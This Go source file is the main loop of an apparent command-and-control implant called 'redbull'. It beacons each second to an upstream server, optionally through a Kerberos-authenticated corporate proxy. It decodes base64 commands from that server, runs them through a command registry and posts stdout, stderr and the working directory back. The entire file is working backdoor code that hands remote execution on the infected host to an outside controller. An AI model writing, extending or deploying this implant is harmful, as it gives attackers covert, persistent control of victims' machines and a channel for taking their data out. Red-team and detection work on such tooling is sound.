package main

import (
	"encoding/base64"
	"fmt"
	"os"
	"os/signal"
	"strings"
	"syscall"
	"time"

	config "redbull"
	"redbull/internal/rbcmd"
	"redbull/internal/rbhttp"
	"redbull/internal/rbkrb"
)

var SLEEP_TIME = 1 * time.Second
var CWD = ""

var cmdCtx *rbcmd.Context

func init() {
	cwd, err := os.Getwd()
	if err != nil {
		panic(err)
	}

	CWD = cwd
	cmdCtx = &rbcmd.Context{
		CWD:       &CWD,
		SleepTime: &SLEEP_TIME,
	}
}

func parseAndExecuteCommand(command string) (string, string, error) {
	commandGroups := strings.Split(command, " ")
	if len(commandGroups) == 0 {
		return "", "", fmt.Errorf("no command groups found for command %s", command)
	}

	commandName := commandGroups[0]
	commandArgs := strings.Join(commandGroups[1:], " ")

	registry := rbcmd.GetRegistry()
	if cmd, ok := registry[commandName]; ok {
		return cmd.Execute(cmdCtx, commandArgs)
	} else {
		return "", "", fmt.Errorf("no command '%s' found", command)
	}
}

func main() {
	termSig := make(chan os.Signal, 1)
	signal.Notify(termSig, syscall.SIGINT, syscall.SIGTERM)

	var httpClient rbhttp.HttpClient
	if config.USE_KRB {
		httpClient = rbkrb.NewKrbCurlHttpClient(config.PROXY_URL)
	} else {
		httpClient = rbhttp.NewSimpleHttpClient()
	}

	for {
		select {
		case <-termSig:
			return
		default:
			time.Sleep(SLEEP_TIME)

			resp, err := rbhttp.Get[rbhttp.CheckInResponse](httpClient, config.UPSTREAM)
			if err != nil {
				continue
			}

			decoded, err := base64.StdEncoding.DecodeString(resp.Command)
			if err != nil {
				sendResult(httpClient, "", "", err.Error())
				continue
			}

			command := string(decoded)
			stdout, stderr, err := parseAndExecuteCommand(command)

			if err != nil {
				stderr = fmt.Sprintf("%s\nerror: %s", stderr, err.Error())
			}

			sendResult(httpClient, command, stdout, stderr)
		}
	}
}

func sendResult(httpClient rbhttp.HttpClient, command, stdout, stderr string) {
	result := rbhttp.HttpBody{
		Command:          command,
		Stdout:           stdout,
		Stderr:           stderr,
		CurrentDirectory: CWD,
	}

	_, err := rbhttp.Post[any](httpClient, config.UPSTREAM, result)
	if err != nil {
		_ = err
	}
}
